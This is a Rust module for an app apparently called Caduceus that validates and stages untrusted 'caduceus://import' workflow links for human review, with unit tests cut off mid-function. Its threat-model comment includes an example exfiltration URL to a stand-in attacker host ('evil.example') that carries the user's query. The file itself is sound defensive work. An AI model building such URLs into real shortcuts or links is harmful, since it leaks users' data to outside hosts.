//! Shareable one-click workflows, imported from a `caduceus://import/…` link.
//!
//! A *workflow* is a named bundle of one or more [`crate::shortcuts::Shortcut`]s
//! — the same primitive that already powers the staff and the Command Center —
//! packaged so someone can hand another Caduceus user a single link and have
//! it show up ready to use. `caduceus://import/<slug>?data=<base64url-json>`.
//!
//! # Threat model — read this before touching validation or staging
//!
//! A `caduceus://` link is **untrusted input from the network**, full stop. It
//! can arrive from a web page's `<a href>`, a chat message, an email, a QR
//! code, or a malicious app that shells out to `open`. macOS hands a
//! registered scheme's payload to Caduceus without asking the sending process
//! to prove anything about itself, and without asking the user for
//! confirmation before the OS-level handoff happens. Anything this module does
//! automatically in response to that handoff is something a malicious website
//! can trigger with zero clicks beyond the one that opened the link.
//!
//! What an attacker gets *if this module gets it wrong*, roughly in order of
//! how bad it is:
//!
//! 1. **Remote code execution.** [`crate::shortcuts::ShortcutKind::RunCommand`]
//!    and `RunAppleScript` shell out. If an imported workflow could silently
//!    add one of these *and* it could silently run (e.g. because it landed on
//!    a hotkey, or a "helpfully" auto-triggered "try it now"), a link click is
//!    then equivalent to remote code execution with the user's own privileges.
//! 2. **Hijacking a trusted action.** Silently overwriting an existing
//!    shortcut id (or one on the user's hotkey table) lets an attacker turn
//!    something the user already trusts and reaches for by habit — "my lock
//!    screen shortcut" — into something else, without the swap ever being
//!    visible.
//! 3. **Exfiltration via `OpenUrl`.** A `target` built to smuggle local state
//!    into a query string (e.g. `https://evil.example/x?d={query}`) run
//!    unattended would leak whatever the user's last selection/query was.
//!    Nothing in this module executes an `OpenUrl` action either, so that
//!    class of trick is inert at import time — but it is still worth a human
//!    seeing the literal destination before adding it.
//! 4. **Resource-exhaustion DoS.** Deeply nested or gigantic JSON, a base64
//!    blob sized to make decoding expensive, or an unbounded flood of pending
//!    imports (repeatedly opening the link) all cost CPU/memory for free.
//!
//! ## The controls this module actually applies
//!
//! * **Nothing here executes anything, ever.** Parsing → strict-schema
//!   validation → staging in memory. The *only* side effect of receiving a
//!   link, even a perfectly well-formed one, is that a [`PendingImport`]
//!   becomes visible to whatever UI calls [`workflows_list_pending`]. Nothing
//!   is written to disk, nothing is added to Settings, and nothing runs until
//!   a human calls [`workflows_commit_import`] with the exact token they were
//!   shown.
//! * **Closed, `deny_unknown_fields` schema.** [`WorkflowManifest`] and
//!   [`WorkflowActionSpec`] reject any field they do not recognise rather than
//!   ignoring it. A future version of Caduceus that reads one more field must
//!   not be handed data an older, unsuspecting version silently accepted.
//! * **Every size bounded, checked before the expensive step.** The raw URL,
//!   the base64 blob, and the decoded JSON each have a hard cap, checked in
//!   that order — so a hostile payload is rejected for being too long before
//!   it is ever base64-decoded or JSON-parsed. See the `MAX_*` constants.
//! * **Never merges into or overwrites existing state.** Committing an import
//!   only *appends* new [`crate::shortcuts::Shortcut`]s with freshly
//!   generated, collision-free ids (see [`unique_shortcut_id`]); it never
//!   reuses an id already in Settings, so it can never silently replace a
//!   shortcut — or the hotkey binding pointing at it — that was already there.
//! * **Risk is classified, not laundered.** [`ImportRisk::High`] (`RunCommand`,
//!   `RunAppleScript`) requires the caller to pass `accept_high_risk: true` to
//!   [`workflows_commit_import`] — the API itself refuses a silent import of a
//!   shell/AppleScript action even if a UI forgets to ask. The literal command
//!   text is handed back in [`PendingAction::target`] unmodified (never
//!   summarised or truncated) specifically so it can be shown to the user
//!   before that confirmation is given. This module does not attempt to
//!   "sanitise" shell text — that is a well-known trap that produces a false
//!   sense of safety. The control is a human reading the command, not a
//!   pattern match trying to guess intent.
//! * **`OpenUrl` targets are restricted to `http`/`https`.** No `file://`,
//!   `javascript:`, `data:`, or recursive `caduceus://` targets.
//! * **Bounded pending queue.** At most [`MAX_PENDING_IMPORTS`] unreviewed
//!   imports are held at once; opening more links than that drops the oldest
//!   rather than growing without bound.
//!
//! Everything above is enforced in [`parse_deep_link`] and [`validate_action`],
//! both pure functions with no Tauri dependency beyond the `Url` type — see the
//! tests at the bottom of this file for the specific hostile inputs they
//! reject.

use std::collections::VecDeque;

use base64::Engine as _;
use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter, Manager, Runtime, State};

use crate::settings::SettingsManager;
use crate::shortcuts::{Shortcut, ShortcutKind};

// ---------------------------------------------------------------------------
// Bounds. Every one of these exists to make a hostile payload cheap to reject.
// ---------------------------------------------------------------------------

/// Hard cap on the whole `caduceus://…` string, checked before any parsing at
/// all. Nothing legitimate needs more than a couple of kilobytes of URL.
const MAX_URL_LEN: usize = 8 * 1024;
/// Cap on the base64url `data` query value itself, checked before decoding.
const MAX_PAYLOAD_B64_LEN: usize = 8 * 1024;
/// Cap on the *decoded* JSON, checked before it is handed to `serde_json`.
/// Deliberately smaller than what `MAX_PAYLOAD_B64_LEN` alone would allow, so
/// the decoded-size check is reachable independent of the encoded-size one.
const MAX_PAYLOAD_JSON_LEN: usize = 4 * 1024;
/// Actions per workflow. A "one-click workflow" bundling more than this is
/// almost certainly not what the phrase means, and it keeps the JSON small.
const MAX_ACTIONS: usize = 8;
const MAX_LABEL_LEN: usize = 120;
const MAX_DESCRIPTION_LEN: usize = 400;
const MAX_TARGET_LEN: usize = 2000;
const MAX_ARGS: usize = 8;
const MAX_ARG_LEN: usize = 500;
const MAX_KEYWORDS: usize = 12;
const MAX_KEYWORD_LEN: usize = 40;
const MAX_ICON_LEN: usize = 48;
/// How many unreviewed imports are kept at once. Opening a link past this
/// drops the oldest — a flood of links is a nuisance, not a leak, since
/// nothing is written to disk until a human commits one by its token.
const MAX_PENDING_IMPORTS: usize = 5;

const SCHEME: &str = "caduceus";
const HOST: &str = "import";
/// Bumped only if the manifest shape changes incompatibly. A payload
/// declaring any other version is rejected outright rather than guessed at —
/// see [`validate_manifest`].
const SCHEMA_VERSION: u32 = 1;

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ImportError {
    #[error("this link is {0} bytes, over the {1}-byte limit")]
    TooLarge(usize, usize),
    #[error("not a usable caduceus:// import link: {0}")]
    Malformed(String),
    #[error("the workflow data is not valid: {0}")]
    Schema(String),
    #[error("{0}")]
    Rejected(String),
}

// ---------------------------------------------------------------------------
// Wire schema — what a link's `data` payload decodes to.
//
// Both structs are `deny_unknown_fields`: an attacker (or a future version of
// this exporter) including a field we do not recognise is rejected wholesale
// rather than having that field quietly dropped. Silently dropping unknown
// data is exactly how a field added in a later version — say, one that *did*
// mean something dangerous — would sail through an older build unnoticed.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields, rename_all = "camelCase")]
pub struct WorkflowManifest {
    #[serde(default = "schema_version_default")]
    pub schema_version: u32,
    pub label: String,
    #[serde(default)]
    pub description: String,
    pub actions: Vec<WorkflowActionSpec>,
}

fn schema_version_default() -> u32 {
    SCHEMA_VERSION
}

/// One shortcut this workflow would add. Deliberately reuses
/// [`crate::shortcuts::ShortcutKind`] rather than inventing a parallel action
/// enum — an unrecognised kind string fails to deserialize as a normal `serde`
/// error, so the closed set of kinds Caduceus already knows how to run is also
/// the closed set an import can ask for. Nothing here can name a kind of
/// action the rest of the app does not already implement.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields, rename_all = "camelCase")]
pub struct WorkflowActionSpec {
    pub label: String,
    #[serde(default)]
    pub description: String,
    pub kind: ShortcutKind,
    #[serde(default)]
    pub target: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub keywords: Vec<String>,
    /// `glyph:<name>` or a short literal symbol/emoji. `image:*` (a reference
    /// to a locally-imported file token) is rejected in validation — a remote
    /// link has no business naming a local file token, imported or otherwise.
    #[serde(default)]
    pub icon: Option<String>,
}

/// A manifest plus the slug it arrived under, once both have passed
/// validation. Intentionally holds nothing but data — no ids have been
/// assigned yet, and nothing has touched Settings.
#[derive(Debug, Clone)]
pub struct ParsedWorkflow {
    pub slug: String,
    pub manifest: WorkflowManifest,
}

// ---------------------------------------------------------------------------
// Risk classification
// ---------------------------------------------------------------------------

/// How much scrutiny an action deserves before it is imported.
///
/// Ordered `Low < Medium < High` by declaration order (see the `derive(Ord)`
/// below) so a workflow's overall risk is simply the maximum over its
/// actions.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ImportRisk {
    Low,
    Medium,
    High,
}

/// `RunCommand` and `RunAppleScript` shell out — see the module threat model.
/// `OpenApp` merely launches something already installed, which is a much
/// smaller blast radius but still not "just data", so it sits at `Medium`.
/// Everything else only ever opens a URL or a page inside Caduceus itself.
fn risk_of(kind: ShortcutKind) -> ImportRisk {
    match kind {
        ShortcutKind::RunCommand | ShortcutKind::RunAppleScript => ImportRisk::High,
        ShortcutKind::OpenApp => ImportRisk::Medium,
        ShortcutKind::OpenUrl
        | ShortcutKind::OpenFeature
        | ShortcutKind::ClipboardView
        | ShortcutKind::SystemMonitor => ImportRisk::Low,
    }
}

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

/// Parse and fully validate a `caduceus://import/<slug>?data=<base64url>`
/// link. Pure — no filesystem, no Settings, no Tauri app handle — so every
/// hostile-input case can be (and is, below) unit tested without spinning up
/// an app.
///
/// Returns the first violation found; callers only ever need to show the
/// human-readable [`ImportError::to_string`], never the raw input back at
/// them.
pub fn parse_deep_link(raw: &str) -> Result<ParsedWorkflow, ImportError> {
    if raw.len() > MAX_URL_LEN {
        return Err(ImportError::TooLarge(raw.len(), MAX_URL_LEN));
    }
    // Reject before `Url::parse` even runs: control characters (including a
    // bare NUL) have no legitimate reason to be in a URL a human clicked, and
    // rejecting them here means every check below can assume printable text.
    if raw.chars().any(|c| c.is_control()) {
        return Err(ImportError::Malformed("contains a control character".into()));
    }

    let url = tauri::Url::parse(raw)
        .map_err(|e| ImportError::Malformed(format!("not a valid URL ({e})")))?;

    if url.scheme() != SCHEME {
        return Err(ImportError::Malformed(format!("expected the '{SCHEME}://' scheme")));
    }
    // Credentials or a port in a `caduceus://` link are never meaningful —
    // Caduceus is the only possible destination — so either one present is a
    // sign the link was built to smuggle something through fields this parser
    // does not otherwise look at.
    if !url.username().is_empty() || url.password().is_some() {
        return Err(ImportError::Malformed("credentials are not allowed in an import link".into()));
    }
    if url.port().is_some() {
        return Err(ImportError::Malformed("a port is not allowed in an import link".into()));
    }
    if url.host_str() != Some(HOST) {
        return Err(ImportError::Malformed(format!("expected '{SCHEME}://{HOST}/<slug>'")));
    }

    let mut segments = url
        .path_segments()
        .into_iter()
        .flatten()
        .filter(|s| !s.is_empty());
    let slug = segments
        .next()
        .ok_or_else(|| ImportError::Malformed("missing the workflow slug".into()))?
        .to_string();
    if segments.next().is_some() {
        return Err(ImportError::Malformed("unexpected extra path segments after the slug".into()));
    }
    validate_slug(&slug)?;

    // Exactly one `data` param. Anything else — an unrecognised key, or `data`
    // repeated — is rejected rather than "the last one wins", since a
    // duplicate key is a classic way to smuggle a value past a check that
    // only inspects the first occurrence.
    let mut data: Option<String> = None;
    for (key, value) in url.query_pairs() {
        if key != "data" {
            return Err(ImportError::Malformed(format!("unrecognised query parameter '{key}'")));
        }
        if data.is_some() {
            return Err(ImportError::Malformed("the 'data' parameter was repeated".into()));
        }
        data = Some(value.into_owned());
    }
    let data = data.ok_or_else(|| ImportError::Malformed("missing the 'data' parameter".into()))?;
    if data.len() > MAX_PAYLOAD_B64_LEN {
        return Err(ImportError::TooLarge(data.len(), MAX_PAYLOAD_B64_LEN));
    }

    let decoded = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(data.as_bytes())
        .map_err(|e| ImportError::Malformed(format!("'data' is not valid base64url ({e})")))?;
    if decoded.len() > MAX_PAYLOAD_JSON_LEN {
        return Err(ImportError::TooLarge(decoded.len(), MAX_PAYLOAD_JSON_LEN));
    }

    let manifest: WorkflowManifest =
        serde_json::from_slice(&decoded).map_err(|e| ImportError::Schema(e.to_string()))?;

    validate_manifest(&manifest)?;

    Ok(ParsedWorkflow { slug, manifest })
}

fn validate_slug(slug: &str) -> Result<(), ImportError> {
    if slug.is_empty() || slug.chars().count() > 64 {
        return Err(ImportError::Malformed("the slug must be 1-64 characters".into()));
    }
    let first_ok = slug
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
    let rest_ok = slug
        .chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    if !first_ok || !rest_ok {
        return Err(ImportError::Malformed(
            "the slug may only contain lowercase letters, digits and '-'".into(),
        ));
    }
    Ok(())
}

fn validate_manifest(m: &WorkflowManifest) -> Result<(), ImportError> {
    if m.schema_version != SCHEMA_VERSION {
        return Err(ImportError::Rejected(format!(
            "unsupported workflow schema version {} (this build understands {SCHEMA_VERSION})",
            m.schema_version
        )));
    }
    bounded_text(&m.label, MAX_LABEL_LEN, false, "label")?;
    if m.label.trim().is_empty() {
        return Err(ImportError::Rejected("the workflow needs a label".into()));
    }
    bounded_text(&m.description, MAX_DESCRIPTION_LEN, false, "description")?;

    if m.actions.is_empty() {
        return Err(ImportError::Rejected("a workflow needs at least one action".into()));
    }
    if m.actions.len() > MAX_ACTIONS {
        return Err(ImportError::Rejected(format!(
            "a workflow may bundle at most {MAX_ACTIONS} actions"
        )));
    }
    for action in &m.actions {
        validate_action(action)?;
    }
    Ok(())
}

fn validate_action(a: &WorkflowActionSpec) -> Result<(), ImportError> {
    bounded_text(&a.label, MAX_LABEL_LEN, false, "action label")?;
    if a.label.trim().is_empty() {
        return Err(ImportError::Rejected("every action needs a label".into()));
    }
    bounded_text(&a.description, MAX_DESCRIPTION_LEN, false, "action description")?;
    // Newlines/tabs are tolerated in `target` — a shell command or AppleScript
    // is legitimately multi-line — but no other control character is.
    bounded_text(&a.target, MAX_TARGET_LEN, true, "action target")?;

    if a.args.len() > MAX_ARGS {
        return Err(ImportError::Rejected(format!("at most {MAX_ARGS} arguments per action")));
    }
    for arg in &a.args {
        bounded_text(arg, MAX_ARG_LEN, true, "action argument")?;
    }
    if a.keywords.len() > MAX_KEYWORDS {
        return Err(ImportError::Rejected(format!("at most {MAX_KEYWORDS} keywords per action")));
    }
    for k in &a.keywords {
        bounded_text(k, MAX_KEYWORD_LEN, false, "keyword")?;
    }

    if let Some(icon) = &a.icon {
        bounded_text(icon, MAX_ICON_LEN, false, "icon")?;
        if icon.starts_with("image:") {
            // `image:*` names a file token a *local* import already placed in
            // app config (see `ShortcutIcon`/backdrop handling). A remote link
            // has no such file, so this can only be an attempt to reference —
            // or collide with — something already on disk.
            return Err(ImportError::Rejected(
                "an imported workflow cannot reference a local image file".into(),
            ));
        }
        if let Some(name) = icon.strip_prefix("glyph:") {
            let well_formed = !name.is_empty()
                && name.len() <= 40
                && name.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
            if !well_formed {
                return Err(ImportError::Rejected("malformed glyph icon name".into()));
            }
            // An unrecognised-but-well-formed glyph name is allowed through:
            // the frontend's glyph lookup already falls back to the first
            // character of the label for anything it does not recognise (see
            // `Shortcut::icon` docs), so this degrades cosmetically, not
            // dangerously.
        }
    }

    match a.kind {
        ShortcutKind::OpenUrl => {
            let url = tauri::Url::parse(&a.target)
                .map_err(|_| ImportError::Rejected("an open-url action needs a valid URL".into()))?;
            if url.scheme() != "http" && url.scheme() != "https" {
                return Err(ImportError::Rejected(
                    "an open-url action may only target http or https".into(),
                ));
            }
        }
        ShortcutKind::OpenApp => {
            if a.target.trim().is_empty() {
                return Err(ImportError::Rejected("an open-app action needs a target".into()));
            }
        }
        ShortcutKind::RunCommand | ShortcutKind::RunAppleScript => {
            if a.target.trim().is_empty() {
                return Err(ImportError::Rejected("this action has no command to run".into()));
            }
            // No further "sanitisation" of the command/script text is applied
            // here on purpose — see the module threat model. Pattern-matching
            // shell syntax to decide what is "safe" is not a control, it is a
            // false sense of one; the actual control is that this text is
            // handed back verbatim in `PendingAction::target` for a human to
            // read, and `workflows_commit_import` refuses to write it to
            // Settings without an explicit high-risk acknowledgement.
        }
        ShortcutKind::OpenFeature => {
            let well_formed = !a.target.is_empty()
                && a.target
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-');
            if !well_formed {
                return Err(ImportError::Rejected(
                    "an open-feature action needs a page id such as 'page.colors'".into(),
                ));
            }
        }
        ShortcutKind::ClipboardView | ShortcutKind::SystemMonitor => {
            if !a.target.is_empty() {
                return Err(ImportError::Rejected("this action kind does not take a target".into()));
            }
        }
    }

    Ok(())
}

/// Bounds and, unless `allow_newline`, forbids control characters. Length is
/// counted in `char`s, not bytes — a payload full of 4-byte UTF-8 code points
/// should not be able to hide 4x its apparent size past a byte-length check.
fn bounded_text(value: &str, max_len: usize, allow_newline: bool, field: &'static str) -> Result<(), ImportError> {
    if value.chars().count() > max_len {
        return Err(ImportError::Rejected(format!("{field} is too long (max {max_len} characters)")));
    }
    let has_bad_control = value
        .chars()
        .any(|c| c.is_control() && !(allow_newline && (c == '\n' || c == '\t')));
    if has_bad_control {
        return Err(ImportError::Rejected(format!("{field} contains a control character")));
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Staging — turning a validated manifest into something a human reviews
// ---------------------------------------------------------------------------

/// One action as it will be shown to the user before import, and as it will
/// be written if they approve it.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PendingAction {
    pub label: String,
    pub description: String,
    pub kind: ShortcutKind,
    /// Shown verbatim — this is the whole point for `RunCommand`/`RunAppleScript`.
    pub target: String,
    pub args: Vec<String>,
    pub keywords: Vec<String>,
    pub icon: String,
    pub risk: ImportRisk,
    /// The shortcut id this action would be written under. Computed against
    /// the settings snapshot at staging time so the UI can show it ("added as
    /// `wf-email-assistant-reply`") — [`workflows_commit_import`] recomputes
    /// it fresh at commit time rather than trusting this value, in case
    /// Settings changed in between.
    pub preview_id: String,
}

/// A staged, not-yet-applied import. Exists only in memory (see
/// [`WorkflowInbox`]) until [`workflows_commit_import`] is called with its
/// `token`, or it is dismissed / evicted.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PendingImport {
    /// Opaque, server-generated. The frontend never constructs or edits one —
    /// it only ever echoes back a token it was handed, which is what makes
    /// `workflows_commit_import` safe to trust without re-validating the
    /// payload against something the caller supplied.
    pub token: String,
    pub slug: String,
    pub label: String,
    pub description: String,
    pub actions: Vec<PendingAction>,
    pub max_risk: ImportRisk,
    pub received_at: chrono::DateTime<chrono::Utc>,
}

/// Turn an id candidate into one guaranteed not to collide with anything in
/// `existing` — by trying `wf-<base>`, then `wf-<base>-2`, `wf-<base>-3`, …
///
/// This is the whole "never silently overwrite" guarantee in one function:
/// importing can only ever *add* an id nothing else is using, never reuse one
/// that is. The fallback UUID suffix exists only so this provably terminates
/// even against a settings file an attacker (or a very determined coincidence)
/// pre-populated with `wf-<base>` through `wf-<base>-999`.
///
/// Takes an iterator of ids rather than `&[Shortcut]` so a caller assigning
/// several ids in a row (see [`build_pending`] and
/// [`workflows_commit_import`]) can fold each freshly assigned id back into
/// what counts as "existing" for the next one — otherwise two actions in the
/// same workflow sharing a label would both compute the same "first free" id
/// and collide with *each other*, not just with Settings.
fn unique_shortcut_id<'a>(existing_ids: impl IntoIterator<Item = &'a str>, base: &str) -> String {
    let existing_ids: Vec<&str> = existing_ids.into_iter().collect();
    let candidate = format!("wf-{base}");
    if !existing_ids.contains(&candidate.as_str()) {
        return candidate;
    }
    for n in 2..1000u32 {
        let candidate = format!("wf-{base}-{n}");
        if !existing_ids.contains(&candidate.as_str()) {
            return candidate;
        }
    }
    format!("wf-{base}-{}", uuid::Uuid::new_v4())
}

/// Slug-ify an action label for use inside a generated shortcut id. Not the
/// only thing keeping ids unique — [`unique_shortcut_id`] still checks — this
/// just keeps the common case readable (`wf-email-assistant-reply` rather than
/// `wf-email-assistant-<uuid>`).
fn slugify(label: &str) -> String {
    let mut out = String::new();
    let mut last_was_dash = true; // suppresses a leading '-'
    for c in label.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c.to_ascii_lowercase());
            last_was_dash = false;
        } else if !last_was_dash {
            out.push('-');
            last_was_dash = true;
        }
    }
    while out.ends_with('-') {
        out.pop();
    }
    if out.is_empty() {
        "action".into()
    } else {
        out.chars().take(40).collect()
    }
}

/// Build a [`PendingImport`] from a validated manifest and the current
/// shortcut list (used only to compute readable `preview_id`s — nothing here
/// touches Settings).
fn build_pending(parsed: ParsedWorkflow, existing: &[Shortcut]) -> PendingImport {
    let ParsedWorkflow { slug, manifest } = parsed;
    // Seeded from Settings, then grown with each id assigned below — see the
    // doc comment on `unique_shortcut_id` for why that growth matters.
    let mut assigned_ids: Vec<String> = existing.iter().map(|s| s.id.clone()).collect();
    let actions: Vec<PendingAction> = manifest
        .actions
        .into_iter()
        .map(|a| {
            let preview_id = unique_shortcut_id(
                assigned_ids.iter().map(String::as_str),
                &format!("{slug}-{}", slugify(&a.label)),
            );
            assigned_ids.push(preview_id.clone());
            PendingAction {
                risk: risk_of(a.kind),
                label: a.label,
                description: a.description,
                kind: a.kind,
                target: a.target,
                args: a.args,
                keywords: a.keywords,
                icon: a.icon.unwrap_or_default(),
                preview_id,
            }
        })
        .collect();
    let max_risk = actions.iter().map(|a| a.risk).max().unwrap_or(ImportRisk::Low);

    PendingImport {
        token: uuid::Uuid::new_v4().to_string(),
        slug,
        label: manifest.label,
        description: manifest.description,
        actions,
        max_risk,
        received_at: chrono::Utc::now(),
    }
}

// ---------------------------------------------------------------------------
// In-memory inbox
// ---------------------------------------------------------------------------

/// Holds imports that have been parsed and validated but not yet reviewed.
/// Managed as Tauri app state — see the wiring notes at the bottom of this
/// file for the one line that has to add it in `lib.rs::setup`.
///
/// Nothing in here ever touches disk. A pending import that is never
/// committed simply falls off the end of the queue (or vanishes at restart);
/// that is a feature, not a bug to fix — it means an ignored link has zero
/// lasting effect.
#[derive(Default)]
pub struct WorkflowInbox(Mutex<VecDeque<PendingImport>>);

impl WorkflowInbox {
    pub fn new() -> Self {
        Self::default()
    }

    fn push(&self, item: PendingImport) {
        let mut q = self.0.lock();
        if q.len() >= MAX_PENDING_IMPORTS {
            q.pop_front();
        }
        q.push_back(item);
    }

    fn list(&self) -> Vec<PendingImport> {
        self.0.lock().iter().cloned().collect()
    }

    fn take(&self, token: &str) -> Option<PendingImport> {
        let mut q = self.0.lock();
        let pos = q.iter().position(|p| p.token == token)?;
        q.remove(pos)
    }
}

/// Event emitted (with no payload — listeners call [`workflows_list_pending`]
/// for the data) whenever a new import is staged, so a Settings/notification
/// UI can react without polling.
pub const WORKFLOW_PENDING_EVENT: &str = "caduceus://workflow-import-pending";

/// Entry point for the OS "open URL" handoff (`RunEvent::Opened` on macOS —
/// see the wiring notes below). Parses, validates, and — only if both
/// succeed — stages the result for a human to review. A malformed, oversized,
/// or otherwise rejected link is logged and dropped: it is never surfaced as
/// something that "almost imported", and nothing about it is executed.
pub fn handle_deep_link<R: Runtime>(app: &AppHandle<R>, raw_url: &str) {
    let parsed = match parse_deep_link(raw_url) {
        Ok(p) => p,
        Err(e) => {
            log::warn!("ignored a caduceus:// import link: {e}");
            return;
        }
    };

    let existing = app
        .try_state::<SettingsManager>()
        .map(|m| m.get().shortcuts)
        .unwrap_or_default();
    let pending = build_pending(parsed, &existing);

    let Some(inbox) = app.try_state::<WorkflowInbox>() else {
        log::error!("a workflow import arrived but WorkflowInbox is not managed — see workflows.rs wiring notes");
        return;
    };
    inbox.push(pending);
    let _ = app.emit(WORKFLOW_PENDING_EVENT, ());
}

// ---------------------------------------------------------------------------
// Commands — the frontend surface. None of these are wired into
// `invoke_handler!` yet; see the wiring notes at the bottom of this file.
// ---------------------------------------------------------------------------

/// Parse-and-stage entry point reachable directly from the frontend, for a
/// "paste a workflow link" affordance in Settings (and for exercising the
/// whole pipeline in dev without an actual OS URL handoff). Applies the exact
/// same validation as [`handle_deep_link`] — this is not a relaxed variant.
#[tauri::command]
pub fn workflows_stage_from_url(
    app: AppHandle,
    inbox: State<'_, WorkflowInbox>,
    settings: State<'_, SettingsManager>,
    url: String,
) -> Result<PendingImport, String> {
    let parsed = parse_deep_link(&url).map_err(|e| e.to_string())?;
    let pending = build_pending(parsed, &settings.get().shortcuts);
    inbox.push(pending.clone());
    let _ = app.emit(WORKFLOW_PENDING_EVENT, ());
    Ok(pending)
}

/// Everything currently awaiting review.
#[tauri::command]
pub fn workflows_list_pending(inbox: State<'_, WorkflowInbox>) -> Vec<PendingImport> {
    inbox.list()
}

/// Discard a pending import without applying it. Returns `false` if the token
/// was not found (already committed, already dismissed, or evicted by the
/// queue cap) — not an error, since "it's already gone" is a fine outcome for
/// a dismiss button to land on.
#[tauri::command]
pub fn workflows_dismiss_pending(inbox: State<'_, WorkflowInbox>, token: String) -> bool {
    inbox.take(&token).is_some()
}

/// What committing an import actually added, for the confirmation UI to
/// summarise.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CommitOutcome {
    pub added_shortcut_ids: Vec<String>,
}

/// Apply a staged import: append its actions to Settings as new shortcuts and
/// persist. The **only** function in this module that writes anything.
///
/// `accept_high_risk` must be explicitly `true` if any action in the import is
/// [`ImportRisk::High`] (`RunCommand`/`RunAppleScript`) — otherwise this
/// refuses and puts the import back in the inbox rather than dropping it, so
/// a UI that forgot to ask still cannot import a shell action by accident,
/// and the user has not lost the (harmless, unexecuted) staged import either.
#[tauri::command]
pub async fn workflows_commit_import(
    app: AppHandle,
    inbox: State<'_, WorkflowInbox>,
    settings: State<'_, SettingsManager>,
    token: String,
    accept_high_risk: bool,
) -> Result<CommitOutcome, String> {
    let pending = inbox
        .take(&token)
        .ok_or_else(|| "that import is no longer pending".to_string())?;

    if pending.max_risk == ImportRisk::High && !accept_high_risk {
        let message = "this workflow runs a shell command or AppleScript and needs explicit \
                        confirmation before it can be imported"
            .to_string();
        // Put it back rather than dropping it: refusing the *commit* must not
        // also destroy the (still inert) staged review.
        inbox.push(pending);
        return Err(message);
    }

    let mut next = settings.get();
    let mut next_order = next.shortcuts.iter().map(|s| s.order_index).max().unwrap_or(-1) + 1;
    let mut added = Vec::with_capacity(pending.actions.len());

    for action in &pending.actions {
        // Recomputed against the live settings snapshot, not trusted from
        // `preview_id` — Settings may have changed since staging.
        let id = unique_shortcut_id(
            next.shortcuts.iter().map(|s| s.id.as_str()),
            &format!("{}-{}", pending.slug, slugify(&action.label)),
        );
        next.shortcuts.push(Shortcut {
            id: id.clone(),
            label: action.label.clone(),
            icon: if action.icon.is_empty() { "✦".into() } else { action.icon.clone() },
            kind: action.kind,
            target: action.target.clone(),
            args: action.args.clone(),
            browser: None,
            // Imported shortcuts never claim a staff slot on their own — the
            // ring is a scarce, prominent 6 slots, and putting something
            // there is a placement decision for the user to make, not a
            // workflow author.
            show_in_staff: false,
            order_index: next_order,
            keywords: action.keywords.clone(),
            description: action.description.clone(),
            hidden: false,
        });
        next_order += 1;
        added.push(id);
    }

    crate::settings::save(&app, &next)?;

    Ok(CommitOutcome { added_shortcut_ids: added })
}

// ---------------------------------------------------------------------------
// Wiring this module in — everything below is what could not be done inside
// this file, because it requires touching files this task does not own.
// See the accompanying report for the full explanation.
//
// 1. `src-tauri/Info.plist` (new file, next to `tauri.conf.json` — Tauri
//    merges it automatically, no `tauri.conf.json` edit needed) must declare
//    the `caduceus` URL scheme via `CFBundleURLTypes`.
// 2. `lib.rs`'s `setup()` needs `app.manage(workflows::WorkflowInbox::new());`
// 3. `lib.rs`'s `.run(|app, event| { … })` needs a `RunEvent::Opened` arm
//    calling `workflows::handle_deep_link(app, url.as_str())` per URL.
// 4. `lib.rs`'s `invoke_handler!` needs the four `workflows_*` commands added
//    to the list.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- test helpers --------------------------------------------------

    fn encode(json: &serde_json::Value) -> String {
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(json.to_string())
    }

    fn link(slug: &str, json: &serde_json::Value) -> String {
        format!("caduceus://import/{slug}?data={}", encode(json))
    }

    fn minimal_manifest() -> serde_json::Value {
        serde_json::json!({
            "schemaVersion": 1,
            "label": "Email Assistant",
            "description": "Drafts replies in your voice.",
            "actions": [{
                "label": "Open Gmail",
                "kind": "open_url",
                "target": "https://mail.google.com",
            }],
        })
    }

    // -- happy path ------------------------------------------------------

    #[test]
    fn accepts_a_well_formed_minimal_workflow() {
        let url = link("email-assistant", &minimal_manifest());
        let parsed = parse_deep_link(&url).expect("should parse");
        assert_eq!(parsed.slug, "email-assistant");
        assert_eq!(parsed.manifest.label, "Email Assistant");
        assert_eq!(parsed.manifest.actions.len(), 1);
        assert_eq!(parsed.manifest.actions[0].kind, ShortcutKind::OpenUrl);
    }

    #[test]
    fn accepts_multiple_actions_up_to_the_cap() {
        let mut manifest = minimal_manifest();
        let actions: Vec<_> = (0..MAX_ACTIONS)
            .map(|i| {
                serde_json::json!({
                    "label": format!("Action {i}"),
                    "kind": "open_url",
                    "target": "https://example.com",
                })
            })
            .collect();
        manifest["actions"] = serde_json::Value::Array(actions);
        let url = link("many-actions", &manifest);
        let parsed = parse_deep_link(&url).expect("exactly the cap should be fine");
        assert_eq!(parsed.manifest.actions.len(), MAX_ACTIONS);
    }

    // -- URL grammar -------------------------------------------------------

    #[test]
    fn rejects_wrong_scheme() {
        let url = format!("https://import/x?data={}", encode(&minimal_manifest()));
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_wrong_host() {
        let url = format!(
